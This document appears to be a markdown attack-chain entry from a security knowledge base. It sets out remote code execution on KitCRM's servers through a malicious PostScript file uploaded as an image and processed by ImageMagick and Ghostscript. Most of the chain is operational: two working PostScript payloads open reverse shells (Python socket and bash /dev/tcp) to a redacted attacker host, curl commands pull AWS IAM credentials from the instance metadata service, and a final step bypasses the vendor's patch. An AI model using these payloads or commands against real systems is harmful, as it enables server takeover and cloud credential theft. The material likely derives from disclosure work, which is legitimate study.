---
tags:
  - rce
  - file-upload
  - imagemagick
  - ghostscript
  - aws
  - reverse-shell
type: attack_chain
tools:
  - '[[tools/ImageMagick]]'
  - '[[tools/Ghostscript]]'
  - '[[tools/Netcat]]'
  - '[[tools/curl]]'
  - '[[tools/Facebook-Messenger]]'
  - '[[tools/bash]]'
  - '[[tools/python]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Discovery]]'
commands:
  - '[[commands/postscript-python-reverse-shell]]'
  - '[[commands/whoami]]'
  - '[[commands/ls]]'
  - '[[commands/cat-readme]]'
  - '[[commands/curl-aws-metadata-role]]'
  - '[[commands/curl-aws-credentials]]'
  - '[[commands/postscript-bash-reverse-shell]]'
platforms:
  - Web
  - AWS
complexity: medium
procedures:
  - '[[procedures/Upload-Malicious-Postscript-File]]'
  - '[[procedures/Integrate-with-Facebook-Messenger]]'
  - '[[procedures/Trigger-Image-Processing-via-Messenger]]'
  - '[[procedures/Receive-and-Explore-Reverse-Shell]]'
  - '[[procedures/Bypass-Initial-Patch-with-Alternative-Payload]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
description: >-
  Exploitation of file upload vulnerability in KitCRM to achieve remote code
  execution via ImageMagick and Ghostscript
skill_level: intermediate
impact_level: high
id: 60f1fcf6-3285-40a4-929a-c59e715c6b72
created_at: '2025-12-11T06:10:32.847Z'
updated_at: '2025-12-11T06:10:32.847Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0002]]'
  - '[[TA0007]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1059]]'
---
# RCE via Malicious Postscript Upload in KitCRM Image Processing

Multi-stage attack chain demonstrating remote code execution in KitCRM by uploading a malicious Postscript file disguised as an image, exploiting lack of file type validation and ImageMagick's integration with Ghostscript. The attack leads to a reverse shell, file access, and AWS metadata exfiltration, though isolated from core infrastructure.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Upload Malicious File] --> B[Integrate Messenger]
    B --> C[Trigger Processing]
    C --> D[Receive Shell]
    D --> E[Bypass Patch]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
    style E fill:#8e44ad
```

## Prerequisites & Requirements

### Required Tools

- [[tools/ImageMagick]]
- [[tools/Ghostscript]]
- [[tools/Netcat]]
- [[tools/curl]]
- [[tools/Facebook-Messenger]]
- [[tools/bash]]
- [[tools/python]]

### Target Environment

- Web application on AWS EC2
- Required services/ports: HTTP/HTTPS access to KitCRM, port 8080 for reverse shell
- Network access requirements: Ability to upload files and receive connections

### Initial Access Requirements

- Access to KitCRM onboarding page
- Facebook account for Messenger integration
- Listener setup on attacker's machine

## Detailed Attack Procedures

### Step 1: Upload Malicious File - [[procedures/Upload-Malicious-Postscript-File]]

**Objective**: Upload a Postscript file containing a reverse shell payload to exploit the lack of file type validation in the image upload feature.

**Instructions**: Create and upload the malicious Postscript file using [[commands/postscript-python-reverse-shell]] to https://kitcrm.com/seller/onboarding/1.

```postscript
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("█████",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') currentdevice putdeviceprops
```

**Expected Output**: File uploaded successfully as a priority product image.

**Success Indicators**:
- Confirmation of upload in the web interface
- No immediate errors or rejections

### Step 2: Integrate with Messenger - [[procedures/Integrate-with-Facebook-Messenger]]

**Objective**: Connect KitCRM to Facebook Messenger to enable command interactions that will trigger image processing.

**Instructions**: Follow KitCRM's integration process to link a Facebook page with Messenger integration.

**Expected Output**: Successful integration confirmation.

**Success Indicators**:
- Messenger bot responds to test messages
- Integration listed in KitCRM dashboard

### Step 3: Trigger Processing - [[procedures/Trigger-Image-Processing-via-Messenger]]

**Objective**: Send commands via Messenger to force processing of the uploaded malicious image by ImageMagick and Ghostscript.

**Instructions**: Send specific commands through Facebook Messenger to Kit, triggering the payload execution.

**Expected Output**: Reverse shell connection initiated to listener.

**Success Indicators**:
- Incoming connection on port 8080
- Shell prompt available

### Step 4: Receive and Explore Shell - [[procedures/Receive-and-Explore-Reverse-Shell]]

**Objective**: Receive the reverse shell and execute commands to explore the system and access sensitive data.

**Instructions**: Listen with [[tools/Netcat]] on port 8080. Once connected, run [[commands/whoami]]:

```bash
whoami
```

Then [[commands/ls]]:

```bash
ls
```

Read file with [[commands/cat-readme]]:

```bash
cat README.md
```

Access metadata with [[commands/curl-aws-metadata-role]]:

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

And [[commands/curl-aws-credentials]]:

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/████████
```

**Expected Output**: Shell access as 'deploy' user, file listings, README content, AWS credentials.

**Success Indicators**:
- User identification as 'deploy'
- Access to internal files and metadata

### Step 5: Bypass Patch - [[procedures/Bypass-Initial-Patch-with-Alternative-Payload]]

**Objective**: Test and bypass the initial remediation by uploading an alternative bash-based payload.

**Instructions**: Upload the alternative payload using [[commands/postscript-bash-reverse-shell]] and repeat triggering steps.

```postscript
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/██████████/8080 0>&1') currentdevice putdeviceprops
```

**Expected Output**: New reverse shell established.

**Success Indicators**:
- Successful execution despite patch
- Shell access regained

## Attack Chain Summary

### Key Achievements

1. Gained reverse shell on KitCRM server
2. Accessed internal files and documentation
3. Retrieved AWS IAM credentials via metadata service

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

*Last updated: 2023-10-01*
